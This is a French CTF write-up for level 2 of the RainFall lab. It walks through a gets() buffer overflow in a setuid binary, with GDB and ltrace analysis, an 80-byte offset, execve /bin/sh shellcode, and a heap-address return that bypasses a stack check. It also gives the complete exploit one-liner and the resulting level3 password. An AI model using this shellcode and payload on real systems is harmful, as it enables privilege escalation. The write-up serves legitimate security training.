# Level 2

## Première observation

On exécute le binaire :
```bash
level2@RainFall:~$ ./level2
test
test
```
Le programme attend une entrée, puis l'affiche.

On vérifie les permissions du binaire :
```bash
level2@RainFall:~$ ls -l level2
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```
Le binaire a les permissions de level3. Si on exécute du code arbitraire, on aura les privilèges de level3.

## Analyse avec GDB

On désassemble le programme :
```bash
gdb ./level2
(gdb) info functions
```
On trouve deux fonctions : main() et p().

On analyse la fonction p() :
```bash
(gdb) disas p
```

## Comprendre le code de p()

La fonction p() fait dans l'ordre :

1. fflush(stdout) : Vide le buffer de sortie
2. gets(buffer) : Lit l'entrée utilisateur >> [la faille]
3. Vérification : Vérifie si l'adresse de retour commence par 0xb
4. puts(buffer) : Affiche l'entrée
5. strdup(buffer) : Copie la chaîne sur la heap

## La vulnérabilité

gets() ne limite pas la taille de l'entrée : buffer overflow possible.

La vérification `if ((saved_eip & 0xb0000000) == 0xb0000000)` détecte si l'adresse de retour pointe vers la stack (adresses commençant par 0xb...). Si c'est le cas, le programme s'arrête avec `_exit(1)`.

Normalement, avec un buffer overflow, on place le shellcode sur la stack et on fait pointer EIP vers la stack. Mais ici, si EIP pointe vers la stack (0xb...), le programme détecte et s'arrête.

Solution: Utiliser la heap au lieu de la stack

## La heap

La heap est une zone mémoire pour les allocations dynamiques (malloc, strdup). Elle est située à des adresses commençant par 0x08... et n'est pas bloquée par la vérification.

La fonction `strdup()` :
- Alloue de la mémoire sur la heap
- Copie notre buffer dedans
- Retourne l'adresse de cette zone

## Trouver l'adresse de la heap

On utilise `ltrace` pour voir où `strdup()` alloue la mémoire :
```bash
level2@RainFall:~$ ltrace ./level2
test
[...]
strdup("test") = 0x0804a008
[...]
```

`strdup()` retourne toujours 0x0804a008 (première allocation heap, toujours à la même adresse).

Cette adresse est importante: c'est là que notre shellcode sera copié.

## Trouver l'offset jusqu'à EIP

On doit déterminer combien d'octets écrire avant d'atteindre l'adresse de retour (EIP).

Test avec GDB :
```bash
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Le programme crashe. On vérifie EIP:
```bash
(gdb) info registers eip
```

Si EIP = 0x41414141 (qui est 'AAAA' en ASCII), on écrase bien EIP.

En testant différentes longueurs, on découvre : 80 octets pour atteindre EIP.

## Le shellcode

On a besoin d'un shellcode qui lance `/bin/sh`. Voici un shellcode de 25 octets:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Ce shellcode fait:
- Construit la chaîne "/bin/sh" sur la stack
- Prépare les arguments pour execve()
- Appelle le syscall execve("/bin/sh", NULL, NULL)
- Le syscall **remplace** le processus actuel par /bin/sh

## Calcul du padding

Layout :
- 25 octets de shellcode
- ? octets de padding
- 4 octets pour l'adresse (EIP)
- Total = 80 octets, (pour atteindre EIP) + 4 octets (pour écraser EIP) = 84 octets

Donc : padding = 80 - 25 = 55 octets (on remplit avec des "A")

## Construction du payload

Notre payload :
```
[shellcode (25 bytes)] + [padding "A" × 55] + [adresse 0x0804a008]
```

Pourquoi 0x0804a008: Parce que `strdup()` va copier notre shellcode à cette adresse. En faisant pointer EIP vers 0x0804a008, le programme sautera vers notre shellcode.

Format little-endian: Sur les systèmes i386, les adresses sont stockées avec l'octet de poids faible en premier.
- Adresse normale : 0x0804a008
- Little-endian : \x08\xa0\x04\x08

## Déroulement de l'exploitation

Voici ce qui se passe étape par étape :

1. **gets() lit notre payload** → Le buffer déborde et écrase EIP (addr retour) avec 0x0804a008
2. **Vérification** → (0x0804a008 & 0xb0000000) = 0x00000000 ≠ 0xb0000000 → OK, continue
3. **puts()** → Affiche notre input
4. **strdup()** → Copie tout notre payload (incluant le shellcode) sur la heap à l'adresse 0x0804a008
5. **p() se termine (return)** → Le CPU lit saved EIP = 0x0804a008 et saute à cette adresse
6. **Exécution à 0x0804a008** → Le CPU exécute notre shellcode instruction par instruction
7. **int 0x80 (syscall execve)** → Remplace le processus level2 par /bin/sh
8. **Shell lancé** → On a un shell avec les privilèges de level3

## Exploitation

```bash
(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08')"; cat) | ./level2
```

Le `;cat` garde le shell ouvert pour pouvoir interagir avec lui.

On obtient un shell :
```bash
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
